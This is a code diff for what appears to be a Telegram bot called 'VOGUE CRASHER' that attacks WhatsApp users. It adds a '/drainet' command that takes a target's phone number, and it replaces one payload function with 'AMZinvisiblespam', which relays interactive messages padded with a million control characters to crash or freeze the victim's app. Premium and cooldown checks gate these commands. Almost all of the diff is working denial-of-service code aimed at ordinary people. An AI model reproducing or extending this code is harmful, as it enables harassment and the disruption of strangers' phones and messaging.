@@ -3472,6 +3472,80 @@ been successfully analyzed.
 //                                                    
 //
 
+bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/drainet <target_number>
+
+Example:
+/drainet 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+\`\`\`ruby
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+
+──────────────────────────
+\`\`\``,
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 1; i++) {
+                try {
+                    await VnXBulldo(sock, target);
+                    await sleep(1500)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
 bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -3519,9 +3593,9 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 2; i++) {
                 try {
-                    await VnXBulldo(sock, target);
+                    await AMZinvisiblespam(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4118,29 +4192,54 @@ async function VnXNewStcDrainKouta1000Gb(sock, target, mention = true) {
   await sleep(1500);
 }
 
-async function P7X(sock, target) {
-  var kuro = generateWAMessageFromContent(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "P7X",
-            format: "EXTENSION"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"bogor\",\"address\":\"jawa\",\"tower_number\":\"99999\",\"city\":\"Indonesia\",\"name\":\"kuroleslie\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"roleplay | ${"\u0000".repeat(900000)}\"}}`,
-            version: 3
+async function AMZinvisiblespam(sock, target) {
+  try {
+    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
+    for (const x of type) {
+      const enty = Math.floor(Math.random() * type.length);
+      const msg = generateWAMessageFromContent(
+        target,
+        {
+          viewOnceMessage: {
+            message: {
+              interactiveResponseMessage: {
+                body: {
+                  text: "\u0003",
+                  format: "DEFAULT"
+                },
+                nativeFlowResponseMessage: {
+                  name: x,
+                  paramsJson: "\x10".repeat(1000000),
+                  version: 3
+                },
+                entryPointConversionSource: type[enty]
+              }
+            }
           }
+        },
+        {
+          participant: { jid: target }
         }
-      }
+      );
+      
+      await sock.relayMessage(
+        target,
+        {
+          groupStatusMessageV2: {
+            message: msg.message
+          }
+        },
+        {
+          messageId: msg.key.id,
+          participant: { jid: target }
+        }
+      );
+      
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
-  }, { userJid: target });
-
-  await sock.relayMessage(target, kuro.message, {
-    participant: { jid: target },
-    messageId: kuro.key.id
-  });
+  } catch (err) {
+    await console.error(` Error pula wakk😹,itayo itayo🥲: ${err.message}`);
+  }
 }
 
 async function VnXNewOneButtonsBlnk(sock, target) {
